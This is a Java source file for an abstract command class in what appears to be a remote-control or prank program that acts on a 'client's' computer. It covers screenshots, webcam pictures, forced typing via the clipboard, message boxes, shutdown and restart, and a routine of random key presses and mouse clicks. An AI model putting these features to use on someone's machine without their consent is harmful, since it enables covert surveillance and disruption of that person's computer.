import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.util.Random;

/**
 * contains the definitions and some implementations (if they are not OS specific) of the features of the program
 */
public abstract class CommandSet implements ClipboardOwner
{
    /** the runtime environment for the host OS, used for OS specific commands */
    private Runtime runtime = Runtime.getRuntime();

    public abstract void eject() throws IOException;
    public abstract void playSound();
    public abstract void shutdown();
    public abstract void restart();
    public abstract void takeCameraPicture();
    public abstract void setWallpaper(Image newWallpaper);

    /**
     * needed for the ClipboardOwner interface. We don't care if we lose ownership of the clipboard
     * @param aClipboard
     * @param aContents
     */
    @Override
    public void lostOwnership(Clipboard aClipboard, Transferable aContents)
    {
    }

    /**
     * "types" the given message on the clients machine. Instead of typing each character it uses the systems clipboard
     * to copy and paste the message
     * @param message the message to type out
     * @throws AWTException if something went wrong creating the robot
     */
    public void type(String message) throws AWTException
    {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        StringSelection stringSelection = new StringSelection(message);
        clipboard.setContents(stringSelection, this);

        Robot robot = new Robot();
        robot.keyPress(KeyEvent.VK_CONTROL);
        robot.keyPress(KeyEvent.VK_V);
        robot.keyRelease(KeyEvent.VK_V);
        robot.keyRelease(KeyEvent.VK_CONTROL);
    }

    /**
     * shows a message box on the clients screen
     * @param message the msg to be displayed in the msg box
     */
    public void showMessage(String message, String title, String type)
    {
        int option = JOptionPane.NO_OPTION;
        if(type.equals("info"))
            option = JOptionPane.INFORMATION_MESSAGE;
        else if(type.equals("error"))
            option = JOptionPane.ERROR_MESSAGE;
        else if(type.equals("question"))
            option = JOptionPane.QUESTION_MESSAGE;
        JOptionPane.showMessageDialog(null, message, title, option);
    }

    /**
     * takes a screenshot of the clients monitor
     * @return a BufferedImage that is the screenshot
     * @throws AWTException if something went wrong when creating the robot
     */
    public BufferedImage takeScreenshot() throws AWTException
    {
        Robot robot = new Robot();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        return robot.createScreenCapture(new Rectangle(screenSize));
    }

    /**
     * randomly presses keys, moves the mouse and clicks mouse buttons on the clients computer
     * @param length the time in ms the random actions should last for
     * @param delay the time delay in ms between each random action
     * @throws AWTException something went wrong create the Robot
     */
    public void chaos(long length, long delay) throws AWTException
    {
        Robot robot = new Robot();
        long start = System.currentTimeMillis();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Random random = new Random();
        KeyCode keyCode = new KeyCode();
        while(System.currentTimeMillis() - start < length)
        {
            try
            {
                int key = keyCode.randomKeyCode();
                System.out.println("Using keycode: " + key);
                robot.keyPress(key);
                robot.keyRelease(key);
                robot.mouseMove(random.nextInt(screenSize.width), random.nextInt(screenSize.height));
                switch(random.nextInt(3))
                {
                    case 0:
                        robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
                        break;
                    case 1:
                        robot.mousePress(InputEvent.BUTTON2_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON2_DOWN_MASK);
                        break;
                    case 2:
                        robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
                        break;
                }
                Thread.sleep(delay);
            }
            catch(InterruptedException ie)
            {
            }
        }
    }

    public Runtime getRuntime()
    {
        return runtime;
    }

}
